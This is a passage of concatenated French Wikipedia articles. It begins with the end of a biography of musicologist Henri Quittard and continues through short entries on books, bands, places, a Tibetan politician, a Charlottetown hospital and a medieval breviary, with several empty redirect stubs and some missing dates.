Toujours en 1899, il rejoint l'équipe de la Schola Cantorum à la Tribune de Saint-Gervais, 3 ans après sa création. Il va notamment y publier sa grande étude sur Henry Du Mont et donner 4 courts articles aux Tablettes de la Schola.
De 1902 à 1910, il collabore aussi avec la "Revue musicale" devenue la "Revue de la Société internationale de musique" en 1908. En 1908/9, il donne des études au "Mercure musical" (puis "Le Mercure musical-la Revue de la Société internationale de musique" enfin le "Bulletin français de la SIM") de Louis Laloy.
De 1904 à 1908, il est publié dans les "Sammelbände der Internationale Musikgesellschaft" et la "Zeitschrift der Internationales Musikgesellschaft", les 2 revues allemandes de la Société internationale de musique.
Diffusée à partir de jusqu'à la fin 1905 en feuilleton dans la Revue musicale, sa monographie consacrée à Henry du Mont est éditée en 1906 par le Mercure de France ("Henri Quittard. Un musicien en France au Henry Du Mont 1610-1684, étude historique et critique. Avec une préface de Jules Combarieu"). En 1910, elle lui vaut le prix Bordin de l'Académie française.
En 1907, il rentre au "Matin" qu'il quitte en 1909 pour "le Figaro", où il restera jusqu'à sa mort. Il y assurera non seulement la chronique musicale mais parfois la chronique judiciaire, le secrétariat de rédaction ou l'actualité militaire pendant la guerre. Il sera aussi témoin de l'assassinat du directeur du journal, Gaston Calmette, par Henriette Caillaux.
Parallèlement, à la suite de la mort de Charles Malherbe, il devient archiviste de la bibliothèque de l'Opéra en .
En 1917, des musicologues rassemblés autour de Lionel de La Laurencie décident de reprendre les activités de l'ancienne Section française de la Société internationale de Musique pour créer la Société française de musicologie, dont Quittard devient secrétaire adjoint. Mais surtout, comme il l'avait fait pour sa biographie de Du Mont, il va commencer à publier dans la revue de la société, le "Bulletin de la Société française de musicologie", ses Notes sur Guillaume de Machaut et son œuvre. La maladie et sa mort en l'empêcheront de terminer ces travaux.
Il est inhumé au cimetière de Saint-Ouen.
Il avait participé à un grand projet lancé en 1913 par Albert Lavignac : l'Encyclopédie de la musique et dictionnaire du conservatoire. La guerre, la mort de Lavignac en 1916, la reprise du projet par La Laurencie… les retards s'accumulèrent pour un début de publication en 1922. Mais il faudra attendre 1931, soit 12 ans après sa mort, le long article de Quittard sur la musique française, « Musique instrumentale jusqu'à Lully (Moyen Âge Renaissance ) »…

</doc>
<doc id="7278047" url="https://fr.wikipedia.org/wiki?curid=7278047" title="Masterman">
Masterman



</doc>
<doc id="7278053" url="https://fr.wikipedia.org/wiki?curid=7278053" title="Saut à ski aux Jeux olympiques d'hiver de 2014">
Saut à ski aux Jeux olympiques d'hiver de 2014



</doc>
<doc id="7278054" url="https://fr.wikipedia.org/wiki?curid=7278054" title="Jérôme Lindon (récit)">
Jérôme Lindon (récit)

Jérôme Lindon est un court récit de souvenirs de Jean Echenoz paru le aux éditions de Minuit. Il s'attache à décrire le lien qui unit l'écrivain avec l'éditeur éponyme, mort quelques mois auparavant.
Résumé.
Ce livre est un court récit de Jean Echenoz consacré à sa relation personnelle avec Jérôme Lindon, éditeur emblématique et refondateur à partir de 1948 des éditions de Minuit – dont l'influence sur la littérature française va du Nouveau roman à ce qui est désormais considéré comme un esprit de famille ou un « style Minuit » créé par Lindon –, écrit en sa mémoire quelques semaines après la mort de ce dernier le . Prenant une forme de tombeau littéraire, il décrit certains aspects et anecdotes de leur relation professionnelle puis amicale qui s'est établie à partir de 1979 avec l'entrée d'Echenoz en littérature et sa fidélité à sa maison d'édition notamment en raison de leurs liens tissés durant plus de vingt ans.

</doc>
<doc id="7278055" url="https://fr.wikipedia.org/wiki?curid=7278055" title="L'Éléphant">
L'Éléphant



</doc>
<doc id="7278063" url="https://fr.wikipedia.org/wiki?curid=7278063" title="La Menace de l'étoile du soir">
La Menace de l'étoile du soir

La Menace de l'étoile du soir (titre original : "Rise of the Evening Star") est le deuxième tome, publié en 2010, de la série de romans "Fablehaven" créée par Brandon Mull.
Résumé.
Tout commence au collège, quand un kobold (une sorte de gobelin) se fait passer pour un nouvel élève de la classe de kendra. Kendra et Seth utilisent un démon, Olloch le glouton, pour s'en débarrasser. Comme leurs grands-parents croient que la société de l'étoile du soir se sert d'eux et compte peut-être les kidnapper, kendra et Seth retournent à Fablehaven où ils rencontrent 3 Chevaliers de l'aube, Vanessa, Coulter et Tanu.Ces trois derniers aident Kendra et Seth à se protéger des menaces qui les guettent. Ils contribuent également à la recherche de l'artéfact caché dans la réserve... Mais un traître de la société de l'étoile du soir pourrait se trouver parmi eux.

</doc>
<doc id="7278065" url="https://fr.wikipedia.org/wiki?curid=7278065" title="Liste des commanderies templières en Vallée d'Aoste">
Liste des commanderies templières en Vallée d'Aoste

Cette liste recense les anciennes commanderies et maisons de l'Ordre du Temple dans la Vallée d'Aoste, région d'Italie.
Histoire et faits marquants.
La présence des templiers en Vallée d'Aoste n'est pas formellement attestée et les quelques biens qui leur auraient appartenu tiennent souvent de la tradition orale. Cependant, quelques historiens médiévistes spécialistes de cet ordre militaire pensent qu'ils étaient forcement présents dans la ville d'Aoste, mais sans pour autant confirmer l'endroit exact. Ceux de langue italienne insistent sur l'importance de la via Francigena, dont un des itinéraires passait par cette ville pour rejoindre ensuite le Piémont via les villes d'Ivrée et de Verceil, puis Plaisance en Émilie-Romagne. Les templiers avaient établi une maison du Temple dans chacune de ces villes.
Aucune publication récente ne traite spécifiquement des templiers en Vallée d'Aoste et il faut plutôt s'orienter vers des ouvrages de la fin du et du début du pour trouver quelques informations à leur sujet.
Leur présence à proximité de Châtillon, à l'emplacement du bourg disparu « des Rives », apparaît comme très vraisemblable si on se réfère à l'ouvrage de Joseph-Auguste Duc sur l'église d'Aoste. Mais il semble que le bourg et son château étaient déjà abandonnés en 1242. Il semble également que le prieuré de Saint-Hélène (Sarre) leur appartenait si on suit le même auteur et cette hypothèse était également retenue par l'historien Jean-Baptiste de Tillier au 
Il convient de préciser que d'autres auteurs pensent que les templiers n'étaient tout simplement pas présents en Vallée d'Aoste.
Possessions templières.
Possessions douteuses ou à confirmer.
Ci-dessous une liste de biens pour lesquels l'appartenance aux templiers n'est pas étayée par des preuves historiques:

</doc>
<doc id="7278067" url="https://fr.wikipedia.org/wiki?curid=7278067" title="The Real Feel">
The Real Feel

The Real Feel est le premier album solo du guitariste et chanteur américain Scott Kannberg alias Spiral Stairs, cofondateur du groupe de rock indie Pavement.
Genèse.
À la suite de problèmes personnels, Kannberg n'est pas très inspiré après le dernier album de Preston School of Industry. Pour cette raison, il décide de se rendre en Australie où des amis lui proposent de jouer un concert. Kannberg accepte et écrit 5 ou 6 chansons avec ces musiciens. Satisfait de l'expérience, il retourne à Seattle avec ces morceaux, à nouveau inspiré.
L'album.
Les chansons sont très différentes de celles composées avec Preston School of Industry, c'est pourquoi il décide de travailler de manière quelque peu différente. Il qualifie l'album comme étant un peu plus honnête et mature, avec un son un peu plus chaud, plus à son style. 
Contrairement aux albums de Preston School of Industry, qu'il a composé entièrement seul, il utilise une autre formule pour The Real Feel et laisse certains musiciens jouer leurs propres lignes de guitare et de basse, ce qui forme selon lui la base de l'album. Il a également passé beaucoup de temps sur les paroles, parlant de ses propres expériences, spécialement de son récent divorce. Il les écrit le soir, en vue d'être plus relaxé et d'écrire de manière plus honnête et ouverte. 
Il invite des membres de Preston School of Industry à jouer sur cet album. Le mixage a été réalisé par Jon Auer, qui a également aidé Kannberg à réaliser ses voix dans le sous-sol de ce dernier. 
Inspiration.
Il affirme avoir été inspiré par Bob Dylan, par le côté introspectif des albums qu'il a sorti à la fin de sa trentaine. Il s'est également inspiré de certains des premiers albums de Fleetwood Mac, spécialement par Then Play On ou encore Bare Trees. Il a également été influencé par Peter Green, Groundhogs et Richard Thompson. 
Anecdote.
L'idée du dernier morceau, sur lequel on peut entendre une femme réciter "Ladies and gentlemen... Spiral Stairs", vient de Kevin Drew, qui voulait d'abord utiliser la formule sur son propre album avant d'abandonner l'idée. 

</doc>
<doc id="7278068" url="https://fr.wikipedia.org/wiki?curid=7278068" title="Tlaxcala de Xicoténcatl">
Tlaxcala de Xicoténcatl



</doc>
<doc id="7278070" url="https://fr.wikipedia.org/wiki?curid=7278070" title="Georg Ludwig Friedrich Laves">
Georg Ludwig Friedrich Laves

Georg Ludwig Friedrich Laves (né le à Uslar et mort le à Hanovre) était un architecte, ingénieur civil et urbaniste allemand. Il vécut et travailla principalement au royaume de Hanovre. Sous le règne d'Ernest-Auguste, il fut l'architecte attitré de la cour hanovrienne et eut ainsi une grande influence dans le développement urbain de la ville de Hanovre. Il est notamment à l'origine de l'opéra de Hanovre et du mausolée d'Ernest-Auguste et de son épouse.

</doc>
<doc id="7278071" url="https://fr.wikipedia.org/wiki?curid=7278071" title="Musée Jean et Denise Letaille - Bullecourt 1917">
Musée Jean et Denise Letaille - Bullecourt 1917



</doc>
<doc id="7278073" url="https://fr.wikipedia.org/wiki?curid=7278073" title="Ard (homonymie)">
Ard (homonymie)

Ard est un nom de personne porté notamment par :
ARD est un sigle qui peut désigner :

</doc>
<doc id="7278074" url="https://fr.wikipedia.org/wiki?curid=7278074" title="L'Éléphant (revue)">
L'Éléphant (revue)

L'Éléphant est une revue trimestrielle française de culture générale lancée en .
Historique.
Elle a été lancée par Jean-Paul Arif, éditeur aux éditions Scrinéo, et Guénaëlle Le Solleu. Cette dernière a quitté son poste de rédacteur en chef adjoint à "La Tribune" pour se consacrer à "L'Éléphant", dont elle est la rédactrice en chef.
Au même titre que "XXI" ou "Feuilleton (revue)", "L’Éléphant" rejoint la famille des "mooks", ces "magazines livres" à la périodicité trimestrielle ou semestrielle contenant des articles s'étalant parfois sur plusieurs doubles pages et au graphisme soigné.
Le premier numéro sort dans les kiosques le vendredi . La revue comprend 160 pages et se vend au prix de 15 euros.
Son objectif est que le lecteur assimile les connaissances à travers leur mémorisation. La revue comprend donc de nombreux quiz, mots croisés et autres activités ludiques élaborés avec la collaboration du laboratoire d'étude des mécanismes cognitifs de l'université Lumière Lyon-II.
"L’Éléphant" permet de parfaire et de tester sa culture générale autour de sujets divers : histoire, philosophie et religions, politique et société, sciences et environnement, arts et littérature, santé et bien-être ou encore international.

</doc>
<doc id="7278078" url="https://fr.wikipedia.org/wiki?curid=7278078" title="Unterseeboot 69">
Unterseeboot 69

Unterseeboot 69 ou U-69 est le nom de plusieurs sous-marins allemands ou U-boot durant la Première et la Seconde Guerre mondiale:

</doc>
<doc id="7278081" url="https://fr.wikipedia.org/wiki?curid=7278081" title="Maille (maritime)">
Maille (maritime)



</doc>
<doc id="7278084" url="https://fr.wikipedia.org/wiki?curid=7278084" title="Chaînon">
Chaînon

Chaînon est synonyme de maille :
Chaînon désigne aussi une chaîne de basses montagnes :

</doc>
<doc id="7278092" url="https://fr.wikipedia.org/wiki?curid=7278092" title="Edwardson">
Edwardson

Edwardson est un patronyme porté notamment par :

</doc>
<doc id="7278098" url="https://fr.wikipedia.org/wiki?curid=7278098" title="Lauraine">
Lauraine



</doc>
<doc id="7278099" url="https://fr.wikipedia.org/wiki?curid=7278099" title="Oléandre">
Oléandre



</doc>
<doc id="7278100" url="https://fr.wikipedia.org/wiki?curid=7278100" title="Nérion">
Nérion



</doc>
<doc id="7278101" url="https://fr.wikipedia.org/wiki?curid=7278101" title="Haswell (Durham)">
Haswell (Durham)

Haswell est un village du comté de Durham, en Angleterre. Ancien village rural, il a connu tout au long du l'exploitation du charbon, avant de décliner à la suite de la fermeture de la mine en 1895.

</doc>
<doc id="7278102" url="https://fr.wikipedia.org/wiki?curid=7278102" title="Rinchen Dhondup Sadhutsang">
Rinchen Dhondup Sadhutsang

 Rinchen Dhondup Sadhutsang (), ou Rinchen Sadutshang (1928, Tréhor, Kham, Tibet - à Rajpur près de Dehradun en Inde), aussi appelé Sadhu Rinchen Dhondup est un homme politique tibétain, ministre du gouvernement tibétain en exil.
Biographie.
Il est le benjamin de quatre frères (dont Lobsang Nyandak Sadutshang et Lo Gendun Sadutshang) et quatre sœurs issus d'une famille de marchands et chefs de clan d'une région du Kham, faisant le commerce de la laine exportant en Inde. Dans les années 1940, il a fait ses études dans une école tenue par des jésuites, le Collège Saint-Joseph à Darjeeling en Inde, interrompues par son mariage avec la nièce de Reting Rinpoché au Tibet. Ils eurent cinq enfants, dont Tsetan Dorji Sadutshang.
Alors qu'il avait 15 ans, Rinchen Sadutshang fut l’interprète qui assista Sonam Wangdu et Dzasak Thupten Samphel, missionnés par le gouvernement du Tibet pour féliciter les alliés après la Seconde Guerre mondiale, qui se rendirent en Inde et en Chine en 1946.
Rinchen Sadutshang fut l'interprète d'anglais lors des discussions de l'Accord en 17 points sur la libération pacifique du Tibet.
Il est membre de l'entourage du dalaï-lama qui l'accompagne en Chine de à pour assister à l'Assemblée populaire nationale et en Inde en 1956 quand il est invité par la Société de la Maha Bodhi pour participer au anniversaire de la mort du Bouddha.
En 1959, lorsque l'Irlande et la Malaisie ont mis la question Tibet à l'ordre du jour de l'Assemblée générale des Nations unies, Rinchen Sadutshang avec Gyalo Dhondup et Tsepon W. D. Shakabpa sont allés à New-York en mission de soutien. Lors de l'assemblée générale qui s'est tenue les 20 et , la Résolution 1353 adoptée a rappelé le respect des droits de l'homme et a souligné l'identité culturelle et religieuse du Tibet. La résolution n'a toutefois fait aucune mention de la République populaire de Chine.
Rinchen Sadutshang fut ministre représentant à Delhi du cinquième Kashag entre 1980 et 1985.
Famille.
Rinchen Sadutshang s'est marié avec Tseyang Sadutshang avec qui il a eu deux filles, Sonam Deki (1945, qui épouse Tashi Wangdi) et Yangchen Dolkar (1951), puis deux fils Tsetan Dorji (1952) et Namgyal Phuntsok (1953), deux sœurs jumelles, Sonam Lhamo et Kelsang Nordon (1954). Il eut un autre fils, mort jeune lors d'une épidémie de rougeole, avant qu'un vaccin ne soit disponible.

</doc>
<doc id="7278104" url="https://fr.wikipedia.org/wiki?curid=7278104" title="Haswell (Angleterre)">
Haswell (Angleterre)



</doc>
<doc id="7278105" url="https://fr.wikipedia.org/wiki?curid=7278105" title="Real Feel">
Real Feel



</doc>
<doc id="7278107" url="https://fr.wikipedia.org/wiki?curid=7278107" title="Christer Olsson">
Christer Olsson

Christer Olsson (né le à Arboga en Suède) est un joueur professionnel suédois de hockey sur glace devenu entraîneur. Il évolue au poste de défenseur.
Biographie.
Carrière en club.
Il débute en senior dans la Division 1 avec l'IFK Arboga en 1988. Il découvre l'Elitserien en 1992 avec le Brynäs IF. Il remporte le Trophée Le Mat 1993. Il est choisi au onzième tour en deux-cent-soixante-quinzième position par les Blues de Saint-Louis lors du repêchage d'entrée dans la LNH 1993. Le , il joue son premier match dans la Ligue nationale de hockey avec les Blues chez les Blackhawks de Chicago. Il ajoute à son palmarès le championnat d'Autriche et l'Interliga 2000 avec l'EC Klagenfurt AC. Il met un terme à sa carrière en 2005.
Carrière en équipe nationale.
Il représente la Suède au niveau international.

</doc>
<doc id="7278108" url="https://fr.wikipedia.org/wiki?curid=7278108" title="Harworth and Bircotes">
Harworth and Bircotes



</doc>
<doc id="7278109" url="https://fr.wikipedia.org/wiki?curid=7278109" title="Harworth et Bircotes">
Harworth et Bircotes



</doc>
<doc id="7278111" url="https://fr.wikipedia.org/wiki?curid=7278111" title="Wolf (groupe)">
Wolf (groupe)

Wolf est un groupe de heavy metal suédois, originaire de Örebro. Formé en 1995, ils comptent six albums.
Biographie.
Débuts (1995–2002).
Wolf est formé en 1995 à Örebro. Composé du chanteur et guitariste Niklas Stålvind, du bassiste Mikael Goding et du batteur Daniel Bergkvist, cette formation débute donc en 1995 avec deux démos intitulées "Devil Eyes" et "Damnation", suivies en 1996 par "The Hills Have Eyes" et "Hell is for Children" de Pat Benatar. En 1997, ils recrutent Bergkvist du groupe The Killers. Ils enregistrent un premier single intitulé "The Howling Scares Me to Death", publié en août 1999 au label Beast ; il est suivi par "In the Shadow of Steel" en . 
Ils enregistrent et publient leur premier album éponyme en avril 2000, produit par Peter Tägtgren. Il comprend la chanson ' qui est accompagné de son propre clip vidéo. Ils recrutent en 2001 un second guitariste, Henrik Johansson, pour l'EP "Moonlight", qu'ils remplacent vite par Johan Bülow, ancien membre de Dreamgod et Fallen Angel, pour leur deuxième album. Ce deuxième album, intitulé ', encore une fois produit par Peter Tägtgren, comprend une reprise de la chanson " de Mercyful Fate. Ils signent ensuite au label Hellion Records pour une distribution de l'album au Brésil, et avec Irond pour la Russie. 
En août 2002, Johan Bülow, quittant le groupe pour former le groupe Chain of Hate, est remplacé par Johannes Losback (Decameron, Seventh One). En décembre 2002, le label British Rage of Achilles édite un vinyle en édition limitée du single ' et une réédition de ' de Slayer.
Période " (2003–2009).
Wolf participe à la tournée ' de janvier 2003 aux côtés de Nocturnal Rites et Evidence One, puis joue en Amérique du Nord. En , Wolf revient aux Abyss Studios pour enregistrer un nouvel album intitulé '. Il est publié en , et comprend les reprises "(Don't Fear) the Reaper" de Blue Öyster Cult, ' de Slayer, et "I'm Not Afraid of Life" des Ramones. Pour ', le groupe signe un contrat de distribution européenne avec le label allemand Massacre Records, et nord-américaine avec Prosthetic Records. Wolf participe ensuite exclusivement au 34.000 Ton Metal Cruise le , avec des groupes comme Skyclad.
En 2005, "" sort en format vinyle au label Immortal Vinyl Records. Il est limité à 500 exemplaires, et comprend la chanson bonus "Déjà vu". Wolf signe un nouveau contrat avec le label Century Media Records et prévoit un album pour 2006. Le groupe entre au Studio Fredman de Gothenburg en juin avec le producteur Fredrik Nordström pour enregistrer leur nouvel album "The Black Flame". Ils jouent des concerts en avril 2007 aux Pays-Bas, puis en Scandinavie en avril et aux côtés de Kreator et Celtic Frost. Le groupe doit cependant écourter sa tournée à cause d'une infection aux cordes vocales de Niklas Stålvind. Ils jouent les 6 et au Sweden Rock Festival.
En 2008, le groupe reprend la chanson ' de Moonspell pour la compilation '. La même année, le groupe se sépare du batteur Tobias Kellgren et le remplace par Uno Bruniusson du groupe In Solitude. Le , ils entrent à nouveau en studio pour l'enregistrement de cinquième album intitulé ". Le groupe joue au festival Muskelrock le à Tyrolen, vers Växjö.
Période " (depuis 2011).
En mars 2011, le groupe annonce la sortie internationale de son sixième album, ', via Century Media Records. En , il sort le clip de la chanson ', issue de son septième album à venir courant de l'année. L'album, " est publié en en Europe. Le style principal de l'album est le dark metal qui change du modern heavy metal très brutal qui était très présent autrefois dans les musiques du groupe.

</doc>
<doc id="7278118" url="https://fr.wikipedia.org/wiki?curid=7278118" title="Harworth">
Harworth

Harworth est une petite ville minière située à 13 km au Nord de Worksop dans le district non-métropolitain de Bassetlaw, dans le Nottinghamshire, en Angleterre. Elle forme avec sa voisine Bircotes la paroisse civile de Harworth et Bircotes. 
Personnalité liée à Harworth.
Le champion du monde de cyclisme 1965 Tom Simpson y a commencé sa carrière cycliste et y est enterré depuis sa mort sur le mont Ventoux en 1967. Un petit musée lui est consacré depuis 2001.

</doc>
<doc id="7278119" url="https://fr.wikipedia.org/wiki?curid=7278119" title="Wallace Grissell">
Wallace Grissell

Wallace Grissell (Hounslow, – Camarillo, ) est un monteur et réalisateur britannique.
Biographie.
Wallace Grissell est l'auteur d'une vingtaine de longs métrages de 1944 à sa mort en 1954.

</doc>
<doc id="7278122" url="https://fr.wikipedia.org/wiki?curid=7278122" title="Lili Bontemps">
Lili Bontemps

 &lt;ns&gt;0&lt;/ns&gt;
 &lt;revision&gt;
 &lt;parentid&gt;205793081&lt;/parentid&gt;
 &lt;timestamp&gt;2023-08-24T06:09:24Z&lt;/timestamp&gt;
 &lt;contributor&gt;
 &lt;username&gt;Polmars&lt;/username&gt;
 &lt;/contributor&gt;
 &lt;comment&gt;/* Filmographie */ lien interne (suite à renommage)&lt;/comment&gt;
 &lt;origin&gt;207203627&lt;/origin&gt;
 &lt;model&gt;wikitext&lt;/model&gt;
 &lt;format&gt;text/x-wiki&lt;/format&gt;
Hélène Biec, dite Lili Bontemps, née le à Gastes et morte le au Bouscat, est une chanteuse et actrice française.

</doc>
<doc id="7278134" url="https://fr.wikipedia.org/wiki?curid=7278134" title="Apple Airplay">
Apple Airplay

 &lt;ns&gt;0&lt;/ns&gt;
 &lt;revision&gt;
 &lt;parentid&gt;95117500&lt;/parentid&gt;
 &lt;timestamp&gt;2019-03-29T13:32:05Z&lt;/timestamp&gt;
 &lt;contributor&gt;
 &lt;username&gt;EmausBot&lt;/username&gt;
 &lt;/contributor&gt;
 &lt;minor /&gt;
 &lt;comment&gt;Robot : répare une double redirection vers AirPlay (Apple)&lt;/comment&gt;
 &lt;origin&gt;157968539&lt;/origin&gt;
 &lt;model&gt;wikitext&lt;/model&gt;
 &lt;format&gt;text/x-wiki&lt;/format&gt;

</doc>
<doc id="7278150" url="https://fr.wikipedia.org/wiki?curid=7278150" title="Géliot">
Géliot

Géliot est un patronyme porté notamment par :

</doc>
<doc id="7278164" url="https://fr.wikipedia.org/wiki?curid=7278164" title="Marie Amélie de Bade">
Marie Amélie de Bade



</doc>
<doc id="7278165" url="https://fr.wikipedia.org/wiki?curid=7278165" title="The Sub-Mariner">
The Sub-Mariner



</doc>
<doc id="7278172" url="https://fr.wikipedia.org/wiki?curid=7278172" title="Religion en mésopotamie">
Religion en mésopotamie



</doc>
<doc id="7278178" url="https://fr.wikipedia.org/wiki?curid=7278178" title="Germ Free Adolescents">
Germ Free Adolescents

Germ Free Adolescents est un album du groupe punk rock X-Ray Spex, sorti en 1978. 
L'album.
Le groupe a déjà connu le succès avec le titre "Oh Bondage, up yours" (qui sera inclus dans les rééditions de l'album) lorsqu'il sort "Germ free Adolescents". Quatre singles en seront issus. Lora Logic, qui n'a joué que sur deux titres du groupe auparavant ("Oh bondage ! Up yours" et "I am a cliché"), quitte rapidement le groupe, sous l'influence de sa mère professeur, pour terminer ses études ; en effet, elle n'avait que 16 ans à l'époque. Elle est remplacée par Rudi (Steve) Thompson, qui joue sur l'album excepté sur "Identity" et "The day the world turned day-glo". Sur ces deux titres, c'est Ted Bunting, un saxophoniste plus expérimenté, qui joue sur les conseils de Falcon Stuart, le manager et producteur du groupe. Rudi Thompson vivra assez mal cette éviction et cet épisode contribuera à la séparation du groupe. 
Poly Styrene (née Marianne Joan Elliott-Said le ) quitte le groupe en 1979, épuisée par les tournées et souffrant de troubles psychologiques. Elle renonce par la suite à la musique punk pour se consacrer à l'étude de Krishna et enregistrer par la suite plusieurs opus sous son propre nom. Elle succombe à un cancer du sein foudroyant le , à l'âge de 53 ans, un mois après que son dernier album "Generation Indigo", unanimement acclamé par la critique musicale anglaise, est sorti en Angleterre et juste un jour après qu'il est sorti aux États-Unis. 
Jak Airport (né Jack Stafford en 1955), qui assure toutes les parties de guitares sur l'album et en particulier le riff de "The day the world turn day-glo" que Poly aimait beaucoup et qui reste une de ses signatures les plus typiques et qui contribuera au son si particulier du groupe, succombe lui aussi à un cancer le à 49 ans. 
L'album fait partie des 1001 Albums You Must Hear Before You Die et a été classé à la des plus grands albums punk-rock par "The Guinness Encyclopedia of Popular Music"(1994), à la des albums punk-rock les plus essentiels par Spin (2001) et à la du Top 50 des albums punk par Mojo. 
Titres.
Tous les titres sont de Poly Styrene. 

</doc>
<doc id="7278182" url="https://fr.wikipedia.org/wiki?curid=7278182" title="Fred Patten">
Fred Patten

Frederick Walter Patten, né le à Los Angeles et mort le , est un historien américain de la science-fiction et des cultures populaires originaires du Japon, notamment le fandom furry.
Biographie.
Libraire et bibliothécaire dans les années 1970-1980, Fred Patten a participé à l'introduction du manga et de l'anime aux États-Unis, notamment chez Streamline Pictures de 1991 à 2002.
En 2005, il a donné sa collection d'environ objets à la de l'université de Californie à Riverside.

</doc>
<doc id="7278190" url="https://fr.wikipedia.org/wiki?curid=7278190" title="Valeriy Pronkin">
Valeriy Pronkin

Valeriy Pronkin (né le à Nijni Novgorod) est un athlète russe, spécialiste du lancer de marteau et du lancer de disque.
Carrière.
Après avoir terminé au disque de lors des Championnats du monde jeunesse à Lille en 2011 et au lancer de marteau lors des Championnats du monde juniors à Barcelone, il remporte le titre du marteau devant Bence Pásztor, lors des Championnats d'Europe juniors 2013 à Rieti.
Avec le marteau de , son record est de , obtenu à Adler le .
Le , il lance le marteau à , record personnel, à Yerino.
Le , il est autorisé par l'IAAF à concourir en tant qu'« athlète neutre autorisé » à la suite de la suspension en de la Russie de compétitions internationales pour dopage d'État. Le , il devient vice-champion du monde aux mondiaux de Londres avec un jet à 78,16 m, battu par Paweł Fajdek.

</doc>
<doc id="7278192" url="https://fr.wikipedia.org/wiki?curid=7278192" title="Hôpital de Charlottetown">
Hôpital de Charlottetown

L'hôpital de Charlottetown est un ancien hôpital de soins intensifs qui était situé à Charlottetown, Île-du-Prince-Édouard. Il a été le premier hôpital public établi dans la province.
Établissement.
La construction se fit en 1879 sous la tutelle de l'évêque Peter McIntyre du Diocèse catholique romain de Charlottetown. C'était le premier hôpital de Charlottetown. Il fut établi dans l'ancienne résidence de l'évêque, maintenant le site de la Basilique-cathédrale Saint-Dunstan au coin des rues Dorchester et Great George. Une grande annexe fut construite en 1882 et l'hôpital fut ouvert aux gens de toutes les religions.
Nouvelles installations.
L'usage croissant de l'Hôpital de Charlottetown surpassa la grosseur de l'hôpital de la rue Great George. En 1902, le diocèse de Charlottetown déménagea l'hôpital aux plus grands quartiers sur la rue Haviland dans l'ouest de la ville. Un nouveau département de maternité fut ouvert en 1918 et l'École d'infirmières à l'hôpital en 1920.
L'Hôpital de Charlottetown était administré par les Sœurs de la Charité de Montréal de 1879 à 1925. Les Sœurs de Sainte Marthe de Charlottetown ont pris en charge l'administration de l'Hôpital de Charlottetown et l'orphelinat St Vincent, une autre responsabilité du diocèse de Charlottetown.
En 1925, l'Hôpital de Charlottetown a déménagé dans un nouvel édifice de briques sur la rue Haviland et l'édifice original de bois fut converti en une maison de retraite où les Sœurs de Sainte Marthe travaillaient. La place se nommait « Sacred Heart Home ».
Le diocèse de Charlottetown fut impliqué dans un autre projet de santé à l'Île-du-Prince-Édouard quand il ouvrit l'Hôpital Western à Alberton en 1944, aussi sous l'administration des Sœurs de Sainte Marthe.
Le diocèse de Charlottetown entreprit une campagne de fonds à la fin des années 1940 et au début des années 1950 pour financer des rénovations majeures et intérieures à l'Hôpital de Charlottetown où une nouvelle aile fut construite.
Administration du gouvernement.
En 1969, le gouvernement provincial pris en charge les opérations de santé du diocèse de Charlottetown comme une partie du plan de développement provincial sous le premier ministre Alex Campbell. L'Hôpital de l'Île-du-Prince-Édouard et l'Hôpital de Charlottetown furent identifiés pour être remplacés par un endroit unique plus moderne.
Fermeture.
En 1982, après 102 ans de service, l'Hôpital de Charlottetown a fermé ses portes quand l'Hôpital Queen Elizabeth ouvrit.
La fermeture de l'Hôpital de Charlottetown et de l'Hôpital de l'Île-du-Prince-Édouard mis la fin des services à l'avortement dans la province offert dans la dernière institution ; l'une des conditions que l'Église catholique a imposé au gouvernement provincial pour fusionner les deux hôpitaux dans l'Hôpital Queen Elizabeth, que tous les services de l'avortement dans la province furent arrêtés.
L'édifice de la rue Haviland resta debout jusqu'au milieu des années 1990 où il y avait des bureaux pour différents départements provinciaux, incluant les permis pour différents véhicules et les examens de conduite pour le département de Transport et Travaux publics.
L'École d'infirmières de l'Hôpital de Charlottetown fut fusionnée avec d'autres écoles d'infirmières dans la province en 1969 pour former l'École d'infirmières de l'Île-du-Prince-Édouard. Cette école ferma en 1994 quand son programme de diplôme fut transféré au baccalauréat à l'Université de l'Île-du-Prince-Édouard. En 1995, le gouvernement provincial payât en partie pour convertir l'édifice où était l'École des infirmières de l'hôpital de Charlottetown en un nouveau édifice pour le campus du Collège Holland appelé le centre de Tourisme et Culinaire, qui héberge une variété de programmes de gestion dans le tourisme et l'hospitalité ainsi que l'Institut Culinaire Canadien. Pour agrandir le campus du nouveau collège Holland, l'édifice de l'hôpital de Charlottetown fut démoli pour faire place à une aire de stationnement.
La maison de retraite Sacred Heart Home fut déménagée à un nouveau édifice de briques durant les années 1950. Elle fut fermée par les Sœurs de Sainte Marthe de l'Île-du-Prince-Édouard et fut vendue à un développeur privé et rénové en un complexe d'appartements pour les personnes âgées.

</doc>
<doc id="7278194" url="https://fr.wikipedia.org/wiki?curid=7278194" title="Scott Shaw (acteur)">
Scott Shaw (acteur)

 
Scott Shaw, né le à Hollywood (Californie), est un acteur, réalisateur et producteur de films d'arts martiaux américain. Il est également l'auteur d'ouvrages sur le mysticisme.

</doc>
<doc id="7278195" url="https://fr.wikipedia.org/wiki?curid=7278195" title="Bréviaire de Jean sans Peur">
Bréviaire de Jean sans Peur

Le Bréviaire de Jean sans Peur est un bréviaire à l'usage de Paris, enluminé. Il était sans doute destiné au duc de Bourgogne Jean sans Peur et à sa femme Marguerite de Bavière. Il est actuellement conservé en deux tomes, un pour l'hiver (Add.35311), un pour l'été (Harley 2897) tous deux à la British Library à Londres.
Historique et attribution.
Les armes présentes au folio 188 du Harley 2897 indique clairement que l'ouvrage était destiné à Jean, duc de Bourgogne et à sa femme Marguerite. Le bréviaire a sans doute été décoré au sein d'un atelier parisien anonyme, mais dont le nom de convention du peintre principal provient de ce manuscrit : le Maître du Bréviaire de Jean sans Peur, un artiste sans doute d'origine néerlandaise, influencé par les Frères de Limbourg et ayant collaboré à la réalisation de livres pour le duc de Berry dont quelques lettrines des Très Riches Heures. Il collabore à l'occasion du bréviaire avec un autre maître anonyme : le Maître d'Egerton.
Dans les années 1420-1430, sans doute après la mort de Marguerite en 1423, le manuscrit est coupé en deux volumes, séparant la liturgie de l'hiver de celle de l'été. Il est alors décidé d'ajouter au second volume le psautier et le calendrier qui se retrouvaient alors manquant. Cette tâche est confiée aux Maîtres de Guillebert de Mets, atelier installé en Flandres. 
